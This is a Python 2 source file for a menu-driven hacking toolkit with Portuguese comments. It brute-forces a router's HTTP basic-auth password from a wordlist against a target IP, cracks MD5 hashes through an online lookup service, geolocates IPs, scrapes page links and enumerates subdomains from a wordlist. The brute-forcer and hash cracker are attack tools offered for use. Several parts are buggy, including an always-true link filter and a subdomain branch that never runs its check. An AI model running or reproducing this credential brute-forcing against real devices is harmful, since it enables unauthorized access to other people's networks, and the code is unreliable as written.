#!/usr/bin/python
# -*- coding: utf-8 -*-

## IMPORTANDO MODULOS ##
import requests
import json
import Queue
import urllib2
import os
import time
from bs4 import BeautifulSoup
from termcolor import colored

print colored("""

██╗██████╗  ██████╗
██║╚════██╗██╔═████╗
██║ █████╔╝██║██╔██║
██║ ╚═══██╗████╔╝██║
██║██████╔╝╚██████╔╝
╚═╝╚═════╝  ╚═════╝
            v 1.0
""", 'green', attrs=['bold'])
print
print colored("1. Brute Force Router", 'yellow', attrs=['bold'])
print colored("2. IP Location", 'yellow', attrs=['bold'])
print colored("3. Search Links", 'yellow', attrs=['bold'])
print colored("4. Decrypt MD5", 'yellow', attrs=['bold'])
print colored("5. Find SubDomain", 'yellow', attrs=['bold'])
print colored("6. Sair", 'yellow', attrs=['bold'])
print

def striped(text, colors):
    color = True
    for k,v in text:
        color = not color
        print colored(k, colors[int(color)], attrs=['bold'])
        color = not color
        print colored(v, colors[int(color)], attrs=['bold'])

option = raw_input("Inform a Option: ")

## Brute Force Router
if option == '1':
    alvo     = raw_input("Target IP: ")
    username = raw_input("Username: ")
    passlist = raw_input("Wordlist: ")

    try:
        global fd
        fd = open(passlist, 'rw')

    except IOError, e:
        print colored("[*] Wordlist Not Found.", 'red', attrs=['bold'])

    senhas = fd.readlines()
    queue = Queue.Queue()

    for password in senhas:
            password = password.rstrip()
            queue.put(password)

    i = 0
    while not queue.empty():
        password = queue.get()
        i = i + 1

        test = requests.get('http://' + alvo, auth=(username, password))
        code = test.status_code
        if code == 200:
            print
            print colored("=================[*SUCCESS*]=================",
                          'blue', attrs=['bold'])
            print colored("USER [*] %s  SENHA [*] %s",
                          'yellow', attrs=['bold']) % (username, password)

        else:
            print colored("=================[*FAIL*]=================",'red', attrs=['bold'])

## IP Location
elif option == '2':

    alvo = raw_input("Target IP: ")

    get = requests.get("http://ip-api.com/json/" + alvo)
    json = json.loads(get.content)

    list_param = []
    list_param.append(['Target:', json['query']])
    list_param.append(['Country:', json['country']])
    list_param.append(['State:', json['regionName']])
    list_param.append(['City:', json['city']])
    list_param.append(['Latitude:', json['lat']])
    list_param.append(['Longitude:', json['lon']])

    ## Exibindo informações
    striped(list_param, ['red', 'blue'])
    print

## Search Links
elif option == '3':
    url = raw_input('Target URL: ')

    request = urllib2.urlopen(url)
    html = request.read()

    soup = BeautifulSoup(html)

    for link in soup.find_all('link'):
        pag = link.get('href')

        if url or url + 'wp-' in pag:
            print colored("LINK => %s", 'blue', attrs=['bold']) % pag

    for link in soup.find_all('script'):
        pag = link.get('src')

        if url or url + 'wp-' in pag:
            print colored("LINK => %s", 'blue', attrs=['bold']) % pag

        else:
            pass

## MD5 Decrypt
elif option == '4':
    md5 = raw_input("Hash MD5: ")
    api = 'http://md5.gromweb.com/query/%s' % md5

    request = urllib2.urlopen(api)
    resul = request.read()

    print colored("Hash", 'red', attrs=['bold'])
    print colored(md5, 'blue', attrs=['bold'])
    print colored("Result", 'red', attrs=['bold'])
    print colored(resul, 'blue', attrs=['bold'])

## Find Subdomain
elif option == '5':
    def subdominio(site):
        try:
            request = requests.get(site)

            if request.status_code == 200:
                print colored("Find Subdomain %s", 'blue', attrs=['bold']) % site

            else:
                print colored("Subdomain Not Found %s", 'yellow', attrs=['bold']) % site

        except:
            print colored("Subdomain Not Found %s", 'yellow', attrs=['bold']) % site

    def regex(lista, site):
        if 'www' in site:
            if site[:8] == 'https://':
                site = site[:8]+lista+site[12:]
                subdominio(site)

            elif site[:7] == 'http://':
                site = site[:7]+lista+site[11:]

            else:
                print "Use https:// or http://"

        else:
            if site[:8] == 'https://':
                site = site[:8]+lista+site[8:]
                subdominio(site)

            elif site[:7] == 'http://':
                site = site[:7]+lista+site[7:]
                subdominio(site)

            else:
                print "Use https:// or http://"

    def inicio():
        word = 'subdominios.txt'
        site = raw_input("Target URL: ")

        word = open(word, 'rw').readlines()

        for l in word:
            l = l.replace('\n', '').replace('\t', '')
            regex(l, site)

    inicio()

## Saida
else:
    print colored("BYE...\n", 'blue', attrs=['bold'])
    time.sleep(2)
    os.system('reset')